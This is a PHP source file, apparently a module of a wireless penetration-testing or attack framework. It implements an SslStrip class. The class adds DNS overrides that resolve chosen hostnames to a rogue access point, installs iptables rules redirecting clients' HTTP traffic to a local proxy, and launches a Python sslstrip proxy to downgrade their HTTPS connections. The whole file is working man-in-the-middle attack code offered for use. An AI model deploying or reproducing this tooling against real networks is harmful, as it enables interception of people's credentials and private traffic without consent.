<?php

namespace VVTS\Classes;

require_once(dirname(__FILE__) . "/../autoload.php");

use \VVTS\Classes\MainLoop;
use \VVTS\Classes\MiscNet;
use \VVTS\Classes\AccessPoint;
use \VVTS\Classes\ScriptEngine;
use \VVTS\Classes\Subscribable;
use \VVTS\Interfaces\IUnblockable;
use \VVTS\Interfaces\IScriptOpaque;
use \VVTS\Types\ScriptVoid;
use \VVTS\Types\ScriptState;
use \VVTS\Types\ScriptStringLiteral;
use \VVTS\Types\ScriptInvokeError;

class SslStrip extends Subscribable implements IUnblockable, IScriptOpaque {
    var $wPort = 8080;
    var $aHosts = [];
    var $hProcess;
    var $hProcessStdout;
    var $hProcessStderr;
    var $aTransitions = [];
    var $bIptablesActive = false;

    function __construct() {
        parent::__construct();
        MainLoop::GetInstance()->RegisterObject($this);
    }

    function Sockets() {
        $aSockets = [];
        if ($this->hProcessStdout !== null) {
            array_push($aSockets, $this->hProcessStdout);
        }
        if ($this->hProcessStderr !== null) {
            array_push($aSockets, $this->hProcessStderr);
        }
        return $aSockets;
    }

    function Onunblock($hSocket) {
        $szLine = fgets($hSocket, 1024);
        if ($szLine === "" || $szLine === false) {
            ScriptEngine::GetInstance()->SetErrstr("sslstrip proxy process ended unexpectedly");
            $this->Teardown();
            $this->PerformTransition("error");
            return;
        }
        printf("sslstrip: %s", $szLine);

        if (strpos($szLine, "started") !== false) {
            printf("[i] sslstrip proxy up on port %d\n", $this->wPort);
            $this->PerformTransition("success");
        }
    }

    function Teardown() {
        if ($this->hProcessStdout !== null) {
            fclose($this->hProcessStdout);
            $this->hProcessStdout = null;
        }
        if ($this->hProcessStderr !== null) {
            fclose($this->hProcessStderr);
            $this->hProcessStderr = null;
        }
        if ($this->hProcess !== null) {
            $aStatus = proc_get_status($this->hProcess);
            if (isset($aStatus["running"]) && $aStatus["running"]) {
                posix_kill($aStatus["pid"], SIGTERM);
            }
            proc_close($this->hProcess);
            $this->hProcess = null;
        }

        if ($this->bIptablesActive) {
            $oAp = AccessPoint::GetInstance();
            if ($oAp->szApInterface !== null) {
                shell_exec(
                    "iptables -t nat -D VVTS_PREROUTING_REDIRECT" .
                    " -i " . escapeshellarg($oAp->szApInterface) .
                    " -p tcp --dport 80" .
                    " -j REDIRECT --to-port " . intval($this->wPort) .
                    " 2>/dev/null"
                );
            }
            $this->bIptablesActive = false;
        }

        $this->CancelAllSubscriptions();
    }

    function PerformTransition($szWhich) {
        if (isset($this->aTransitions[$szWhich])) {
            $oTransition = $this->aTransitions[$szWhich];
            $this->aTransitions = [];
            ScriptEngine::GetInstance()->EnterState($oTransition);
        }
    }

    function StateMachineInvoke_add_host(...$aArguments) {
        if (count($aArguments) !== 1) {
            throw new ScriptInvokeError("add_host requires one argument");
        } else if (!($aArguments[0] instanceof ScriptStringLiteral)) {
            throw new ScriptInvokeError("add_host requires a string argument");
        }

        $szHost = trim($aArguments[0]->szLiteral);
        if ($szHost === "") {
            throw new ScriptInvokeError("add_host: hostname may not be empty");
        }

        array_push($this->aHosts, $szHost);
        return new ScriptVoid();
    }

    function StateMachineSet_port($oValue) {
        if (!($oValue instanceof ScriptStringLiteral)) {
            throw new ScriptInvokeError("port must be of type string");
        }
        $wPort = intval($oValue->szLiteral);
        if ($wPort <= 0 || $wPort > 65535) {
            throw new ScriptInvokeError("port must be a valid port number, got: " . $oValue->szLiteral);
        }
        $this->wPort = $wPort;
    }

    function StateMachineInvoke_bring_up(...$aArguments) {
        if (count($aArguments) !== 2) {
            throw new ScriptInvokeError("bring_up requires a success state and an error state");
        } else if (!($aArguments[0] instanceof ScriptState) || !($aArguments[1] instanceof ScriptState)) {
            throw new ScriptInvokeError("bring_up requires two state arguments");
        }
        if (count($this->aHosts) === 0) {
            throw new ScriptInvokeError("bring_up: no hosts added via add_host()");
        }

        $this->aTransitions["success"] = ScriptEngine::GetInstance()->RegisterStateTransition($aArguments[0]);
        $this->aTransitions["error"] = ScriptEngine::GetInstance()->RegisterStateTransition($aArguments[1]);

        $oAp = AccessPoint::GetInstance();

        /* register DNS overrides so clients resolve target hosts to the AP's IP */
        if ($oAp->dwIpv4Address !== null && $oAp->oDnsMitm !== null) {
            $szApIp = MiscNet::DwordToIpv4String($oAp->dwIpv4Address);
            foreach ($this->aHosts as $szHost) {
                printf("[i] sslstrip: adding DNS override %s -> %s\n", $szHost, $szApIp);
                $oAp->oDnsMitm->SetOverride($szHost, $szApIp);
            }
        } else {
            ScriptEngine::GetInstance()->SetErrstr("sslstrip: accesspoint with dns_enable must be up before calling bring_up()");
            $this->PerformTransition("error");
            return new ScriptVoid();
        }

        /* redirect HTTP traffic on the AP interface to our proxy */
        MiscNet::IptablesInitBranch(false, "nat", "PREROUTING", "VVTS_PREROUTING_REDIRECT", false);
        shell_exec(
            "iptables -t nat -A VVTS_PREROUTING_REDIRECT" .
            " -i " . escapeshellarg($oAp->szApInterface) .
            " -p tcp --dport 80" .
            " -j REDIRECT --to-port " . intval($this->wPort)
        );
        $this->bIptablesActive = true;

        $szScript = dirname(__FILE__) . "/../src/sslstrip_proxy_generic.py";
        $aSpec = [
            0 => ["file", "/dev/null", "r"],
            1 => ["pipe", "w"],
            2 => ["pipe", "w"]
        ];
        $this->hProcess = proc_open(
            "exec python3 " . escapeshellarg($szScript) . " " . intval($this->wPort) . " " . escapeshellarg($szApIp),
            $aSpec,
            $aPipes
        );
        if ($this->hProcess === false) {
            ScriptEngine::GetInstance()->SetErrstr("sslstrip: failed to start python3 proxy");
            $this->Teardown();
            $this->PerformTransition("error");
            return new ScriptVoid();
        }
        $this->hProcessStdout = $aPipes[1];
        $this->hProcessStderr = $aPipes[2];

        return new ScriptVoid();
    }
}

?>
